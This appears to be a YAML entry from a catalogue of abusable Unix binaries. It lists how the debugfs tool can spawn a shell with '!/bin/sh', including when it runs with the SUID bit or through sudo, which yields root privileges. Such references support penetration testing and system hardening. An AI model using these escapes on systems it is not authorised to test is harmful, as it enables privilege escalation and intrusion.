---
functions:
  shell:
    - code: |
        debugfs
        !/bin/sh
  suid:
    - code: |
        ./debugfs
        !/bin/sh
  sudo:
    - code: |
        sudo debugfs
        !/bin/sh
---
